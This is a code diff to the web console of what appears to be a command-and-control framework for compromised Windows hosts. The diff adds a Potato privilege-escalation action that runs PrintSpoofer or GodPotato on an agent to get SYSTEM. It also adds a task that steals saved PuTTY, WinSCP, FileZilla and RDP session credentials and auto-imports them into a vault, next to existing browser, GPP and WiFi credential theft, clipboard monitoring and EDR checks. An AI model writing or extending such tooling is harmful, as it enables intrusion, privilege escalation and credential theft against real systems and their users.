@@ -3051,6 +3051,33 @@ async function runCtxAction(act) {
       break;
     }
 
+    case 'potatoPrivesc': {
+      const aid = act.id || activeAgent?.id; if (!aid) break;
+      showQuickForm('🥔 SeImpersonate → SYSTEM (Potato)', [
+        {key:'tool', label:'Tool (must be uploaded)', type:'select', options:[
+          {v:'PrintSpoofer64.exe', l:'PrintSpoofer (print spool trigger)'},
+          {v:'GodPotato-NET4.exe', l:'GodPotato (.NET 4 — Win10/2019+)'},
+          {v:'GodPotato-NET2.exe', l:'GodPotato (.NET 2 — legacy)'},
+          {v:'MultiPotato.exe',    l:'MultiPotato (custom trigger)'},
+        ], def:'PrintSpoofer64.exe'},
+        {key:'cmd', label:'Command to run as SYSTEM', ph:'cmd.exe', def:'cmd.exe'},
+      ], vals => {
+        if (!vals.tool) { toast('Tool required','red'); return; }
+        const tool = vals.tool;
+        const cmd  = vals.cmd || 'cmd.exe';
+        // PrintSpoofer: -i -c <cmd>   GodPotato: -cmd <cmd>
+        let args;
+        if (tool.toLowerCase().includes('printspoofer')) {
+          args = `-i -c "${cmd}"`;
+        } else if (tool.toLowerCase().includes('godpotato')) {
+          args = `-cmd "${cmd}"`;
+        } else {
+          args = `-c "${cmd}"`;
+        }
+        runDotnetExec(aid, tool, args, `${tool} → SYSTEM`);
+      });
+      break;
+    }
     case 'adPassDesc': {
       const aid = act.id || activeAgent?.id; if (!aid) break;
       // PowerShell ADSI query — no RSAT needed, works on any domain member
@@ -3665,6 +3692,8 @@ function agentContextMenu(e, agentId) {
       null,
       {label:'Hook Check (EDR)',           action:{fn:'selectAndTask', id, type:'HOOK_CHECK',  args:''}},
       {label:'HW Breakpoint Check',        action:{fn:'selectAndTask', id, type:'HW_BP_CHECK', args:''}},
+      null,
+      {label:'🥔  SeImpersonate → SYSTEM (Potato)…', action:{fn:'potatoPrivesc', id}},
     ]},
     {_sub:'🔑  AD Attacks', items:[
       {_sub:'🎫  Rubeus (Kerberos)', items:[
@@ -3726,8 +3755,9 @@ function agentContextMenu(e, agentId) {
       {label:'⏹  Screenwatch Stop',          action:{fn:'selectAndTask', id, type:'SCREENWATCH_STOP',  args:''}},
       null,
       {label:'🌐  Browser Creds (Chrome/Edge/Brave)', action:{fn:'selectAndTask', id, type:'BROWSER_CREDS',  args:''}},
-      {label:'🗂  GPP Passwords (MS14-025 / SYSVOL)', action:{fn:'selectAndTask', id, type:'GPP_PASSWORDS', args:''}},
-      {label:'📶  WiFi Passwords',                    action:{fn:'selectAndTask', id, type:'WIFI_CREDS',     args:''}},
+      {label:'🗂  GPP Passwords (MS14-025 / SYSVOL)', action:{fn:'selectAndTask', id, type:'GPP_PASSWORDS',  args:''}},
+      {label:'📶  WiFi Passwords',                    action:{fn:'selectAndTask', id, type:'WIFI_CREDS',      args:''}},
+      {label:'🖥  Session Creds (PuTTY/WinSCP/FZ/RDP)', action:{fn:'selectAndTask', id, type:'SESSION_CREDS', args:''}},
       null,
       {label:'📎  Clipboard (once)',          action:{fn:'selectAndTask', id, type:'CLIP_GET',           args:''}},
       {label:'📋  Clipboard Monitor Start',   action:{fn:'selectAndTask', id, type:'CLIP_MONITOR_START', args:''}},
@@ -8637,6 +8667,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'browsercreds': case 'browser-creds': case 'bcreds': taskType='BROWSER_CREDS'; break;
     case 'gpp': case 'gpp-passwords': case 'gpppw': taskType='GPP_PASSWORDS'; break;
     case 'wifi': case 'wifi-creds': case 'wificreds': taskType='WIFI_CREDS'; break;
+    case 'sessioncreds': case 'session-creds': case 'screds': taskType='SESSION_CREDS'; break;
     case 'search': {
       // search [root] <pattern>   e.g. search *.kdbx  or  search C:\Users *.pfx
       taskType = 'SEARCH'; taskArgs = args; break;
@@ -9379,7 +9410,7 @@ async function pollResult(taskID, agentID) {
         }
         addConsoleOutputForAgent(aid, out || (err ? '' : '[done]'), err, r.data.created_at);
         // Auto-import GPP / WiFi / browser credentials to vault
-        const _vaultTypes = ['BROWSER_CREDS', 'GPP_PASSWORDS', 'WIFI_CREDS'];
+        const _vaultTypes = ['BROWSER_CREDS', 'GPP_PASSWORDS', 'WIFI_CREDS', 'SESSION_CREDS'];
         if (_vaultTypes.includes(r.data.task_type) && out && !err) {
           try {
             const parsed = JSON.parse(out);
@@ -9400,8 +9431,9 @@ async function pollResult(taskID, agentID) {
                 if (cr?.ok) imported++;
               }
               if (imported > 0) {
-                const label = r.data.task_type === 'WIFI_CREDS' ? '📶 WiFi'
-                            : r.data.task_type === 'GPP_PASSWORDS' ? '🗂 GPP'
+                const label = r.data.task_type === 'WIFI_CREDS'     ? '📶 WiFi'
+                            : r.data.task_type === 'GPP_PASSWORDS'  ? '🗂 GPP'
+                            : r.data.task_type === 'SESSION_CREDS'  ? '🖥 Session'
                             : '🌐 Browser';
                 toast(`${label} creds: ${imported} imported to vault`, 'green');
                 loadCreds();
